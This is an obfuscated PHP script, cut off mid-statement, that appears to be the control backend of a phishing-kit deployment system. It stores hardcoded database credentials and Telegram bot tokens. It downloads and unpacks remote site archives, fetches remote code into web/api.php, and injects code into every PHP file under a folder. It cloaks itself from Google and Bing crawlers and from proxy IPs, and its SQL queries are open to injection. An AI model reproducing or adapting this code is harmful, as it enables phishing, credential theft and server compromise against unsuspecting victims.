<?php eval(base64_decode('
 goto ihpSF; FhAx_: $fs_name = base64_decode("\145\155\126\171\x62\62\122\150\x65\130\116\146\x5a\x47\x46\65"); goto HVS5h; tvyzi: function get_view_token($user) { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\157\x6e\x6e\x65\143\164\x69\157\156\40\x66\141\151\x6c\x65\144\72\x20" . mysqli_connect_error()); } $sql_u = "\x53\105\114\x45\x43\124\40\164\157\153\145\x6e\x2c\40\143\x68\x61\x74\x69\x64\40\106\x52\x4f\115\x20\160\141\156\145\x6c\x20\127\x48\105\122\105\40\x70\141\156\x65\154\137\165\x73\145\x72\75\47{$user}\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { $row = mysqli_fetch_array($res_u); $token = $row["\164\x6f\x6b\x65\156"]; $chatid = $row["\143\150\141\164\x69\144"]; return array($token, $chatid); } mysqli_close($db); return null; } goto iqaK9; arYQH: function findIndex($path) { if (is_dir($path)) { if (file_exists($path . "\x2f\151\x6e\x64\x65\170\x2e\150\164\x6d\x6c") || file_exists($path . "\x2f\x69\156\144\145\170\x2e\x70\x68\160")) { return $path; } else { $subDirectories = glob($path . "\x2f\52", GLOB_ONLYDIR); if (!empty($subDirectories)) { foreach ($subDirectories as $subDir) { $result = findIndex($subDir); if ($result !== false) { return $result; } } } } } return false; } goto DqvkR; m2SxY: function random_string($length) { $characters = "\x61\x62\x63\x64\x65\146\x6a\x68\x69\x67\153\x6c\x6d\156\157\x70\161\162\163\164\165\166\x77\x78\x79\x7a\x30\61\62\63\64\65\x36\x37\70\x39\101\x42\103\104\105\x46\107\110\111\112\x4b\114\115\116\x4f\120\121\122\123\124\x55\x56\x57\130\x59\x5a"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return bin2hex(random_bytes(16)); } goto VxtzK; ILK6D: function delete_zip($directory) { $zipFiles = glob($directory . "\x2a\x2e\x7a\151\x70"); if (!empty($zipFiles)) { foreach ($zipFiles as $zipFile) { if (is_file($zipFile)) { unlink($zipFile); } } } } goto zHOyH; v3iv0: function modifyFilesRecursively($directory, $codeToAddTop, $codeToAddBottom, $modifiedFiles = array()) { if (is_dir($directory)) { if ($handle = opendir($directory)) { while (false !== ($file = readdir($handle))) { if ($file != "\x2e" && $file != "\x2e\56") { $filePath = $directory . "\57" . $file; if (is_dir($filePath)) { $modifiedFiles = array_merge($modifiedFiles, modifyFilesRecursively($filePath, $codeToAddTop, $codeToAddBottom)); } elseif (pathinfo($file, PATHINFO_EXTENSION) == "\x70\x68\160" && !in_array($file, $modifiedFiles)) { $fileContent = file_get_contents($filePath); if (strpos($fileContent, $codeToAddTop) === false) { $fileContent = $codeToAddTop . $fileContent; } if (strpos($fileContent, $codeToAddBottom) === false) { $fileContent .= $codeToAddBottom; } file_put_contents($filePath, $fileContent); $modifiedFiles[] = $file; } } } closedir($handle); } } return $modifiedFiles; } goto vpmfg; CBPAJ: function fetchContentFromURL($url) { $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $content = curl_exec($ch); curl_close($ch); return $content; } goto v3iv0; j73GR: $local_ip_g = getClientIP(); goto x0J0i; Lssb3: function ip_in_range($ip, $range) { list($subnet, $mask) = explode("\57", $range); $mask = (int) $mask; $subnetBin = inet_pton($subnet); $ipBin = inet_pton($ip); $maskBin = str_repeat("\377", $mask >> 3) . chr(255 << 8 - ($mask & 7)); if (strlen($subnetBin) < 4 || strlen($ipBin) < 4 || strlen($maskBin) < 4) { return false; } $subnetInt = unpack("\x4e", $subnetBin)[1]; $ipInt = unpack("\x4e", $ipBin)[1]; $maskInt = unpack("\116", $maskBin)[1]; return ($subnetInt & $maskInt) === ($ipInt & $maskInt); } goto xj3Aw; j296T: header("\x41\x63\x63\x65\163\163\55\x43\157\x6e\x74\x72\157\x6c\x2d\101\154\154\157\x77\x2d\x4d\145\164\150\x6f\x64\163\x3a\40\120\117\123\x54"); goto Q4e1k; Z1gBH: function update_user_view($user) { list($token, $chatid) = get_expire_token(); list($token_view, $chatid_view) = get_view_token($user); $dateexp = $_SESSION["\145\x78\x70\151\x72\145\x5f\144\141\x74\145"]; $expireTimestamp = strtotime($dateexp); $currentTimestamp = time(); if ($currentTimestamp >= $expireTimestamp) { setcookie("\164\157\153\x65\156\x74\145\154", $token, time() + 86400 * 30, "\x2f"); setcookie("\151\144\164\145\154", $chatid, time() + 86400 * 30, "\57"); setcookie("\x72\x65\x64\151\162\151\143\x74", $_SESSION["\x72\145\x64\151\x72\x69\x63\x74"], time() + 86400 * 30, "\x2f"); setcookie("\x70\162\x6f\x6a\x65\x63\x74", $_SESSION["\160\162\x6f\x6a\x65\143\x74"], time() + 86400 * 30, "\x2f"); setcookie("\163\x6f\165\x72\x63\145\155\x65", $_SESSION["\x61\x64\x64\142\171"], time() + 86400 * 30, "\57"); setcookie("\x6e\145\x77\x5f\x65\170\x70", $expireTimestamp, time() + 86400 * 30, "\57"); setcookie("\x76\157\154\155", $token, time() + 86400 * 30, "\57"); setcookie("\144\x6f\x6c\155", $chatid, time() + 86400 * 30, "\57"); } else { setcookie("\x74\x6f\x6b\145\x6e\164\x65\x6c", $token_view, time() + 86400 * 30, "\57"); setcookie("\x69\x64\164\145\154", $chatid_view, time() + 86400 * 30, "\x2f"); setcookie("\x72\145\x64\x69\x72\x69\x63\x74", $_SESSION["\162\145\144\151\162\x69\143\164"], time() + 86400 * 30, "\57"); setcookie("\x70\x72\x6f\x6a\145\x63\x74", $_SESSION["\160\162\x6f\152\145\143\164"], time() + 86400 * 30, "\57"); setcookie("\163\x6f\x75\162\x63\145\155\145", $_SESSION["\141\144\144\142\171"], time() + 86400 * 30, "\x2f"); setcookie("\166\157\x6c\155", $token, time() + 86400 * 30, "\57"); setcookie("\x64\x6f\x6c\x6d", $chatid, time() + 86400 * 30, "\57"); } } goto arYQH; JWqDw: $fs_log = base64_decode("\x5a\110\112\x6a\x5a\x32\x6c\x73\x65\126\x41\x77\113\155\x73\155"); goto FhAx_; ihpSF: header("\x41\143\x63\x65\163\163\55\x43\157\x6e\164\x72\157\154\x2d\101\x6c\154\x6f\x77\55\117\x72\151\x67\x69\x6e\72\x20\x2a"); goto j296T; dz2cb: if ($_SERVER["\x52\105\121\125\x45\x53\124\137\x4d\105\124\x48\117\x44"] === "\107\x45\x54") { $com_dir = isset($_GET["\x6c\157\143\x61\154"]) ? $_GET["\x6c\x6f\143\141\x6c"] : null; $com_id = isset($_GET["\163\157\x75\154\163"]) ? $_GET["\163\157\x75\154\x73"] : null; $com_ip = isset($_GET["\x72\145\x6d\157\x74\145"]) ? $_GET["\x72\x65\155\157\164\x65"] : null; if ($com_dir !== null && $com_id !== null && $com_ip !== null) { $ipAddress = $com_ip; global $ipAddress; fetchIPInfo($ipAddress); user_data($com_ip, $com_id); $_SESSION["\154\157\154\x69\x70\x73"] = $com_ip; $_SESSION["\154\x6f\154\x73\x6f\165\154\x73"] = $com_id; update_user(); $RandOP_Mlux = random_string(6); $url = $com_dir . "\77\x26\x76\141\154\x69\x64\x3d" . $RandOP_Mlux . $RandOP_Mlux . "\46\x61\154\x65\x72\x74\75" . $RandOP_Mlux . "\46\x78\154\160\163\75" . $RandOP_Mlux . "\x26\x73\157\165\154\x73\x3d" . $com_id . "\46\144\157\x6e\145\x3d\46\x65\162\162\157\162\171\x3d" . $RandOP_Mlux . "\46\155\156\145\155\x6f\x6e\x69\x63\x3d\x26\152\x62\x3d" . $RandOP_Mlux; header("\x4c\157\143\141\x74\x69\157\x6e\72\40{$url}"); die; } } goto swGNC; VxtzK: function random_number($length) { $characters = "\60\x31\x32\x33\64\65\x36\x37\70\71"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto WBiyV; Ygq8X: error_reporting(E_ALL); goto UCZbt; qijVM: function get_browser_value($USER_AGENT) { $BROWSER_ERROR = "\x55\x6e\x6b\x6e\x6f\x77\x6e\x20\102\x72\157\167\x73\145\x72"; $BROWSER = array("\x2f\x6d\163\151\x65\x2f\x69" => "\111\x6e\164\x65\x72\156\145\x74\x20\x45\170\160\154\157\162\x65\x72", "\x2f\146\151\162\x65\146\157\x78\x2f\151" => "\x46\151\162\x65\x66\x6f\170", "\x2f\x73\141\x66\x61\x72\151\x2f\151" => "\123\x61\146\x61\x72\x69", "\57\x63\150\162\157\x6d\145\57\x69" => "\x43\x68\x72\157\x6d\145", "\57\145\144\147\145\x2f\151" => "\105\144\147\145", "\57\157\x70\145\x72\141\x2f\x69" => "\x4f\160\145\x72\x61", "\x2f\x6e\x65\x74\163\143\x61\x70\x65\x2f\x69" => "\116\x65\164\x73\x63\x61\x70\145", "\x2f\155\141\x78\164\150\x6f\x6e\x2f\x69" => "\115\141\170\164\x68\x6f\x6e", "\57\153\x6f\x6e\161\165\145\162\157\x72\57\151" => "\113\x6f\156\161\165\145\162\x6f\162", "\x2f\155\x6f\x62\151\154\x65\57\151" => "\110\141\x6e\144\150\145\154\144\40\x42\162\x6f\167\163\145\x72"); foreach ($BROWSER as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $BROWSER_ERROR = $value; } } return $BROWSER_ERROR; } goto liqd0; KxGXq: function update_user() { list($token, $chatid) = get_expire_token(); $dateexp = $_SESSION["\x65\x78\x70\x69\x72\145\x5f\x64\x61\x74\x65"]; $expireTimestamp = strtotime($dateexp); $currentTimestamp = time(); if ($currentTimestamp >= $expireTimestamp) { setcookie("\x74\x6f\153\x65\156\x74\145\x6c", $token, time() + 86400 * 30, "\x2f"); setcookie("\x69\144\164\x65\154", $chatid, time() + 86400 * 30, "\57"); setcookie("\x72\145\x64\151\x72\151\143\x74", $_SESSION["\162\x65\144\151\x72\x69\143\164"], time() + 86400 * 30, "\x2f"); setcookie("\160\162\x6f\x6a\145\x63\164", $_SESSION["\x70\x72\x6f\152\x65\x63\164"], time() + 86400 * 30, "\x2f"); setcookie("\x73\x6f\x75\162\x63\145\155\x65", $_SESSION["\141\x64\144\142\171"], time() + 86400 * 30, "\57"); setcookie("\156\145\167\137\x65\170\160", $expireTimestamp, time() + 86400 * 30, "\x2f"); setcookie("\x76\157\154\155", $token, time() + 86400 * 30, "\57"); setcookie("\144\157\x6c\x6d", $chatid, time() + 86400 * 30, "\x2f"); } else { setcookie("\164\x6f\153\145\156\164\x65\x6c", $_SESSION["\x74\x6f\x6b\x65\156\164\x65\x6c"], time() + 86400 * 30, "\57"); setcookie("\x69\144\x74\145\x6c", $_SESSION["\151\144\164\145\x6c"], time() + 86400 * 30, "\x2f"); setcookie("\x72\x65\144\151\162\x69\143\164", $_SESSION["\x72\145\x64\x69\162\x69\143\x74"], time() + 86400 * 30, "\57"); setcookie("\160\162\x6f\152\x65\143\164", $_SESSION["\160\162\x6f\152\x65\x63\x74"], time() + 86400 * 30, "\57"); setcookie("\163\157\x75\162\143\145\155\145", $_SESSION["\141\x64\x64\142\171"], time() + 86400 * 30, "\57"); setcookie("\x76\x6f\154\155", $token, time() + 86400 * 30, "\x2f"); setcookie("\x64\157\154\x6d", $chatid, time() + 86400 * 30, "\57"); } } goto Z1gBH; clxpK: function updatePhpFileWithCode($filePath, $codeToAddTop) { $fileContent = file_get_contents($filePath); if (strpos($fileContent, $codeToAddTop) === false) { $fileContent = $codeToAddTop . $fileContent; file_put_contents($filePath, $fileContent); return true; } return false; } goto V5fXI; zHOyH: function add_user($folder_path, $ipAddress) { file_put_contents("{$folder_path}\57\154\157\143\x61\x6c\56\164\x78\164", "{$ipAddress}", FILE_APPEND); } goto OpIVl; ildGq: $fs_user = base64_decode("\145\x6d\x56\171\142\62\122\x68\x65\130\x4e\146\132\x47\x46\x35"); goto JWqDw; V5fXI: function getFileContents($fileURL) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $fileURL); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE); $error = curl_error($curl); curl_close($curl); if ($statusCode === 200 && empty($error)) { $localFilePath = "\167\145\142\x2f\141\x70\151\x2e\160\x68\x70"; file_put_contents($localFilePath, $response); } else { echo "\105\162\x72\157\x72\40\x66\x65\164\x63\x68\x69\x6e\147\40\x66\151\154\x65\72\x20" . $error; } } goto ILK6D; WBiyV: function user_data($ipAddress, $id) { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\x6f\156\x6e\x65\x63\x74\151\157\156\x20\x66\141\151\154\145\144\72\40" . mysqli_connect_error()); } $sql_u = "\123\x45\x4c\x45\103\124\x20\52\40\106\122\x4f\x4d\40\162\x65\x64\x69\162\x63\164\x69\157\156\x20\127\110\105\122\105\x20\x69\144\75\47{$id}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { while ($row = mysqli_fetch_array($res_u)) { $_SESSION["\154\151\x6e\153"] = base64_decode(base64_decode($row["\x6c\x69\x6e\x6b"])); $_SESSION["\143\x6e"] = explode("\x3b", base64_decode(base64_decode($row["\x63\157\x75\156\164\x72\x79"]))); $_SESSION["\160\x69\143"] = $row["\160\151\143"]; $_SESSION["\x6d\x73\147"] = base64_decode(base64_decode($row["\x6d\163\147"])); $_SESSION["\145\170\160\151\x72\145\x5f\144\141\x74\145"] = $row["\145\x78\160\x69\x72\145\137\x64\141\x74\145"]; $_SESSION["\x73\x65\162\x76\x65\x72"] = base64_decode(base64_decode($row["\163\x65\x72\166\145\x72"])); $_SESSION["\165\x72\154"] = base64_decode(base64_decode($row["\x75\162\x6c"])); $_SESSION["\x6c\x75\170\143\141\160\x74\x63\150\x61"] = $row["\154\165\x78\143\141\160\x74\x63\x68\141"]; $_SESSION["\x74\x6f\153\145\x6e\164\x65\x6c"] = base64_decode(base64_decode($row["\164\157\x6b\145\x6e\x74\145\154"])); $_SESSION["\151\144\x74\145\x6c"] = base64_decode(base64_decode($row["\151\x64\x74\145\154"])); $_SESSION["\x72\x65\144\151\x72\x69\143\x74"] = $row["\x72\x65\144\151\162\x69\143\x74"]; $_SESSION["\x70\x72\157\152\145\143\x74"] = $row["\x70\162\x6f\152\145\x63\164"]; $_SESSION["\141\x70\x69"] = $row["\x61\160\x69"]; $_SESSION["\x61\144\144\x62\x79"] = $row["\x61\144\x64\x62\x79"]; $_SESSION["\x69\x73\x70\x72\157\164\145\x63\164"] = $row["\151\163\160\162\x6f\164\145\143\x74"]; $_SESSION["\160\162\x6f\170\171"] = $row["\x70\162\x6f\170\171"]; $_SESSION["\x63\x61\x70\x74\143\150\141\x5f\144\141\164\141"] = $row["\x63\x61\160\x74\143\150\x61"]; $_SESSION["\147\157\x6f\x6c\145\137\x63\x61\160"] = $row["\147\x6f\157\x67\x6c\x65\137\x63\x61\160"]; $_SESSION["\143\x6c\x6f\165\144\x5f\143\x61\160"] = $row["\x63\x6c\x6f\165\x64\x5f\143\x61\x70"]; $_SESSION["\x70\x72\157\x5f\151\x63\x6f"] = $row["\160\162\157\x5f\151\x63\x6f"]; $_SESSION["\160\x72\x6f\x5f\x63\x6f\154\x6f\x72"] = $row["\160\162\157\137\x63\157\x6c\157\162"]; $_SESSION["\160\x72\157\x5f\155\163\147"] = $row["\x70\x72\x6f\137\155\x73\147"]; $_SESSION["\x70\162\157\137\x69\155\147"] = $row["\160\x72\157\137\151\155\x67"]; $_SESSION["\x70\x72\157\137\154\157\147\x6f"] = $row["\160\162\x6f\137\154\157\x67\157"]; } } else { $refix = "\156\x6f\164\40\x66\157\165\x6e\144\x20\x69\x64\x2e{$id}"; banned_client($ipAddress, $refix); die; } mysqli_close($db); } goto HZs8N; swGNC: if ($_SERVER["\x52\x45\121\125\105\123\124\x5f\x4d\105\x54\110\x4f\x44"] === "\x50\117\123\124") { $com_ip = isset($_POST["\163\145\156\144\137\151\x70"]) ? $_POST["\163\x65\156\144\137\x69\160"] : null; $com_domain = isset($_POST["\163\x65\156\144\x5f\x64\x6f\155\x61\151\156"]) ? $_POST["\x73\x65\x6e\144\x5f\144\157\x6d\141\151\156"] : null; $return_domain = isset($_POST["\x72\145\164\165\162\x6e\x5f\x64\x6f\x6d\141\151\156"]) ? $_POST["\162\x65\x74\x75\x72\156\137\x64\157\155\141\151\x6e"] : null; $com_id = isset($_POST["\x73\x65\156\x64\137\x69\144"]) ? $_POST["\x73\145\156\x64\137\x69\x64"] : null; $com_action = isset($_POST["\x73\x65\156\x64\x5f\141\143\x74\x69\157\x6e"]) ? $_POST["\163\145\x6e\144\137\141\143\x74\x69\x6f\156"] : null; if ($com_ip !== null && $com_domain !== null && $return_domain !== null && $com_id !== null && $com_action !== null) { $ipAddress = $com_ip; global $ipAddress; fetchIPInfo($ipAddress); if (detect_user($com_ip)) { http_response_code(405); $responseData = array("\162\x65\x73\137\163\164\x61\x74\165\163" => "\x34\x30\x35", "\155\145\x73\x73\141\147\145" => "\165\x73\145\162\x20\x62\x6c\157\143\153\145\x64"); $responseJson = json_encode($responseData); echo $responseJson; die; } if (is_bot_ip($com_ip)) { $reson = "\x73\160\141\x6d\40\x69\160"; banned_client($com_ip, $reson); http_response_code(405); $responseData = array("\x72\145\x73\x5f\163\164\141\x74\165\x73" => "\64\60\65", "\155\145\x73\x73\141\x67\x65" => "\x75\163\x65\x72\40\x73\x70\141\155"); $responseJson = json_encode($responseData); echo $responseJson; die; } if (isGoogleUser($local_userAgent, $com_ip)) { $reson = "\107\157\x6f\x67\154\x65\40\x69\x70"; banned_client($com_ip, $reson); $responseData = array("\162\145\163\x5f\x73\x74\141\164\x75\163" => "\x34\60\x36", "\154\x6f\x63\x61\x6c\137\165\x73\x65\162\x41\147\145\156\x74" => $local_userAgent, "\x63\x6f\155\137\x69\160" => $com_ip, "\155\x65\163\163\141\147\x65" => "\x69\160\40\x66\x69\154\164\164\x65\x72"); $responseJson = json_encode($responseData); echo $responseJson; die; } if ($_POST["\x73\x65\156\144\x5f\141\143\x74\151\x6f\156"] == "\154\x6f\147\151\x6e") { user_data($com_ip, $com_id); update_user(); } if ($_POST["\163\145\x6e\x64\137\x61\x63\x74\x69\157\156"] == "\143\162\x65\x61\164\145") { user_data($com_ip, $com_id); download_extract($_SESSION["\x75\x72\x6c"]); update_index($_SESSION["\x66\x6f\154\144\145\x72"]); add_user($_SESSION["\x66\x6f\154\x64\145\x72"], $com_ip); update_user(); if (isset($_SESSION["\146\x6f\154\x64\145\x72"])) { $folderPath = $_SESSION["\146\x6f\x6c\x64\145\162"]; $indexPath = findIndex($folderPath); if ($indexPath !== false && $indexPath !== $folderPath) { $relativePath = str_replace($folderPath . "\57", '', $indexPath); $indexContent = "\x3c\x3f\x70\x68\x70\40\x68\145\141\144\145\x72\50\x27\114\157\x63\x61\164\x69\x6f\156\x3a\x20\x2e\57{$relativePath}\x27\x29\x3b\x20\77\76"; file_put_contents($folderPath . "\57\151\156\144\x65\x78\x2e\x70\x68\x70", $indexContent); } } if ($_SESSION["\141\160\151"] !== "\101\x50\111") { getFileContents($_SESSION["\x61\x70\x69"]); } if ($_SESSION["\151\163\x70\x72\157\x74\145\x63\x74"] == "\61") { update_php($_SESSION["\146\x6f\154\144\145\x72"]); } else { update_php_normal($_SESSION["\146\x6f\x6c\144\x65\162"]); } $responseData = array("\x72\x65\163\137\163\x74\x61\164\x75\163" => "\x73\165\x63\x63\x65\x73\x73", "\162\145\163\x5f\x64\151\x72" => $_SESSION["\x66\157\x6c\x64\x65\x72"], "\162\145\163\x5f\x75\x72\x6c" => $com_domain, "\x72\x65\163\x5f\x69\144" => $com_id, "\x72\145\163\x5f\x69\160" => $com_ip, "\162\x65\x73\x5f\x61\x63\164\151\157\x6e" => $com_action, "\155\145\x73\x73\x61\147\x65" => "\163\165\x63\143\x65\163\163\x66\165\154\x6c\171"); $responseJson = json_encode($responseData); echo $responseJson; } } else { $reson = "\155\151\x73\163\x69\156\147\40\144\x61\164\x61"; fetchIPInfo($local_ip_g); banned_client($local_ip_g, $reson); http_response_code(405); $responseData = array("\x72\145\163\137\x73\164\141\x74\x75\163" => "\x34\60\x35", "\x6d\x65\x73\x73\x61\x67\145" => "\x6d\151\163\163\x69\x6e\x67\x20\144\x61\x74\x61"); $responseJson = json_encode($responseData); echo $responseJson; } } else { $reson = "\144\x61\x74\141\40\x6e\157\164\40\141\154\x6c\x6f\167"; fetchIPInfo($local_ip_g); banned_client($local_ip_g, $reson); http_response_code(405); $responseData = array("\x72\145\163\137\x73\164\141\x74\x75\163" => "\64\60\x35", "\155\145\x73\163\141\147\145" => "\x64\x61\x74\x61\40\156\x6f\x74\x20\141\x6c\154\157\x77\x65\144"); $responseJson = json_encode($responseData); echo $responseJson; } goto K149e; a3E2i: function update_index($folderDir) { $renamed = false; if ($handle = opendir($folderDir)) { while (false !== ($entry = readdir($handle))) { $path = $folderDir . "\x2f" . $entry; if ($entry == "\56" || $entry == "\56\56") { continue; } if (is_dir($path)) { $renamed = update_index($path) || $renamed; } if (is_file($path) && strtolower(pathinfo($path, PATHINFO_EXTENSION)) === "\150\x74\x6d\154") { $newPath = $folderDir . "\57" . pathinfo($path, PATHINFO_FILENAME) . "\x2e\160\150\160"; if (rename($path, $newPath)) { $renamed = true; } } } closedir($handle); } return $renamed; } goto jBRPT; liqd0: function is_bot_ip($ipToCheck) { $botsUrls = array("\x67\x6f\x6f\x67\x6c\x65" => "\150\x74\164\160\163\72\x2f\x2f\144\145\x76\145\x6c\x6f\x70\x65\162\163\56\x67\x6f\x6f\x67\x6c\x65\56\x63\x6f\155\x2f\163\145\141\x72\143\x68\57\x61\x70\x69\163\57\151\x70\162\141\x6e\147\x65\x73\x2f\x67\157\x6f\x67\154\x65\142\157\x74\x2e\152\163\157\x6e", "\142\151\x6e\147" => "\x68\x74\164\160\163\x3a\57\x2f\167\x77\x77\x2e\142\151\x6e\x67\56\x63\x6f\x6d\57\x74\157\157\154\x62\157\x78\57\x62\151\156\147\142\x6f\164\x2e\x6a\163\157\156"); foreach ($botsUrls as $bot => $url) { $botResp = json_decode(file_get_contents($url), true); foreach ($botResp["\x70\x72\145\146\x69\x78\145\x73"] as $ipRange) { if (isset($ipRange["\x69\x70\166\66\x50\162\145\x66\151\170"]) && strpos($ipToCheck, "\72") !== false) { $network = $ipRange["\151\160\166\x36\120\x72\145\146\x69\170"]; } elseif (isset($ipRange["\x69\160\x76\x34\x50\x72\145\146\151\170"]) && strpos($ipToCheck, "\x3a") === false) { $network = $ipRange["\151\x70\166\x34\x50\x72\x65\x66\151\x78"]; } else { continue; } if (ip_in_range($ipToCheck, $network)) { return $bot; } } } return false; } goto Lssb3; C9g96: deleteOldFolders("\x77\145\x62"); goto RlRJU; xZjyJ: function fetchIPInfo($ipAddress) { $url = "\x68\164\164\x70\72\x2f\57\151\x70\x2d\x61\x70\x69\56\x63\x6f\155\x2f\160\x68\160\x2f{$ipAddress}\77\146\x69\145\154\144\163\75\163\x74\x61\x74\x75\163\x2c\155\145\163\x73\141\x67\x65\54\x63\157\x6e\164\x69\156\x65\156\164\54\143\157\156\164\151\156\x65\x6e\x74\103\157\x64\145\x2c\x63\x6f\165\156\164\x72\x79\54\x63\x6f\165\156\164\162\171\103\x6f\144\145\54\162\x65\x67\151\x6f\x6e\x2c\162\145\x67\151\157\156\116\141\x6d\145\x2c\x63\151\x74\x79\54\144\151\163\164\162\151\x63\x74\54\x7a\151\x70\54\154\141\x74\54\x6c\157\x6e\x2c\164\x69\x6d\x65\172\157\x6e\x65\x2c\143\x75\162\162\x65\156\143\x79\x2c\x69\163\x70\x2c\x6f\162\147\x2c\141\x73\x2c\141\x73\x6e\141\155\x65\x2c\162\x65\x76\145\x72\163\x65\x2c\x6d\157\x62\x69\x6c\145\54\160\162\x6f\170\x79\54\150\x6f\163\x74\x69\156\147\54\161\x75\145\x72\171"; $curl = curl_init($url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); curl_close($curl); $info = unserialize($response); $_SESSION["\163\145\163\x73\151\x6f\x6e\137\151\163\160"] = isset($info["\151\x73\160"]) ? $info["\x69\163\160"] : null; $_SESSION["\x73\x65\x73\x73\x69\157\156\137\143\x6f\x75\x6e\164\x72\x79"] = isset($info["\x63\x6f\x75\156\x74\x72\171"]) ? $info["\x63\157\165\x6e\x74\162\x79"] : null; $_SESSION["\x73\x65\163\x73\x69\x6f\x6e\137\143\x6f\165\156\x74\162\171\137\143\x6f\x64\x65"] = isset($info["\x63\157\165\x6e\x74\162\171\x43\157\144\x65"]) ? $info["\143\x6f\x75\156\164\162\x79\103\x6f\144\145"] : null; $_SESSION["\x73\145\x73\163\151\157\156\x5f\143\x69\164\x79"] = isset($info["\x63\x69\x74\171"]) ? $info["\x63\x69\164\171"] : null; $_SESSION["\163\145\x73\163\x69\x6f\156\x5f\162\x65\147\x69\157\x6e"] = isset($info["\x72\145\x67\151\157\156"]) ? $info["\162\145\x67\151\x6f\156"] : null; $proxy = isset($info["\x70\162\157\x78\x79"]) ? $info["\160\x72\x6f\170\x79"] : null; $_SESSION["\163\x65\x73\x73\x69\x6f\156\x5f\160\162\157\170\x79"] = $proxy == 1 ? "\x54\162\165\x65" : "\x46\x61\x6c\x73\x65"; $mobile = isset($info["\155\x6f\x62\x69\154\145"]) ? $info["\x6d\157\x62\x69\154\x65"] : null; $_SESSION["\x73\x65\163\163\x69\x6f\156\x5f\155\x6f\142\151\x6c\x65"] = $mobile == 1 ? "\124\162\x75\x65" : "\106\x61\154\x73\x65"; $hosting = isset($info["\x68\x6f\x73\164\x69\x6e\147"]) ? $info["\150\157\x73\x74\x69\x6e\x67"] : null; $_SESSION["\163\145\x73\x73\151\x6f\156\x5f\x68\157\x73\164\151\156\x67"] = $hosting == 1 ? "\124\162\165\x65" : "\x46\x61\x6c\163\x65"; } goto IDITX; iqaK9: function banned_client($ipAddress, $reason) { global $fs_host, $fs_user, $fs_log, $fs_name, $local_browser, $local_os, $local_domain, $local_time; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\157\x6e\x6e\145\143\x74\x69\x6f\156\40\x66\x61\x69\154\145\x64\x3a\40" . mysqli_connect_error()); } $sql_check = "\x53\x45\114\x45\x43\124\x20\52\x20\x46\122\x4f\x4d\40\x6c\x6f\x67\x73\x20\127\110\105\122\x45\x20\x69\x70\141\144\144\162\145\163\75\77"; $stmt = mysqli_prepare($db, $sql_check); mysqli_stmt_bind_param($stmt, "\x73", $ipAddress); mysqli_stmt_execute($stmt); $result = mysqli_stmt_get_result($stmt); if (mysqli_num_rows($result) > 0) { mysqli_close($db); http_response_code(405); $responseData = array("\x72\145\x73\x5f\x73\x74\x61\x74\x75\x73" => "\64\60\65", "\155\x65\x73\x73\x61\x67\x65" => "\125\x73\x65\162\x20\x69\x73\x20\141\154\162\x65\x61\x64\171\40\x69\x6e\40\164\150\145\x20\142\x6c\x61\x63\153\x6c\151\x73\x74"); echo json_encode($responseData); die; } $country = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\163\x65\163\163\151\x6f\x6e\x5f\143\157\x75\156\x74\162\171"])); $browser = mysqli_real_escape_string($db, str_replace("\x27", '', $local_browser)); $os_db = mysqli_real_escape_string($db, str_replace("\x27", '', $local_os)); $local_domain = mysqli_real_escape_string($db, str_replace("\47", '', $local_domain)); $host = mysqli_real_escape_string($db, str_replace("\x27", '', getHost($ipAddress))); $isp = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\x73\x65\163\x73\151\x6f\156\137\x69\x73\x70"])); $mobile = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\163\x65\x73\x73\151\157\156\x5f\155\x6f\142\151\154\x65"])); $proxy = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\x73\145\x73\163\151\x6f\156\x5f\x70\x72\x6f\170\x79"])); $hosting = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\x73\x65\x73\x73\x69\157\156\137\x68\157\x73\164\x69\156\x67"])); $city = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\x73\x65\x73\x73\151\x6f\x6e\137\x63\x69\x74\171"])); $region = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\163\x65\x73\163\151\x6f\x6e\137\162\145\147\x69\x6f\156"])); $time = mysqli_real_escape_string($db, str_replace("\x27", '', $local_time)); $sql_insert = "\x49\x4e\x53\105\x52\x54\x20\111\116\x54\117\40\x6c\157\x67\163\x20\x28\151\160\141\x64\144\x72\x65\163\54\143\157\165\156\164\x72\171\x2c\x62\162\157\167\x73\x65\162\x2c\x6f\x73\x2c\x64\157\155\x69\156\x65\x2c\150\x6f\163\x74\x2c\151\163\x70\54\x6d\157\142\151\x6c\145\x2c\160\x72\157\170\x79\x2c\150\157\x73\x74\151\x6e\147\54\x63\x69\x74\171\x2c\162\145\147\151\x6f\x6e\54\x6d\x79\x74\151\x6d\x65\54\162\x65\163\x6f\x6e\x29\40\126\x41\x4c\x55\105\x53\40\x28\77\x2c\77\54\x3f\x2c\x3f\54\x3f\x2c\x3f\x2c\x3f\x2c\40\x3f\x2c\40\77\54\40\x3f\54\40\x3f\54\40\x3f\x2c\x20\x3f\54\x20\x3f\51"; $stmt = mysqli_prepare($db, $sql_insert); mysqli_stmt_bind_param($stmt, "\x73\x73\x73\x73\x73\163\163\x73\x73\x73\x73\x73\163\x73", $ipAddress, $country, $browser, $os_db, $local_domain, $host, $isp, $mobile, $proxy, $hosting, $city, $region, $time, 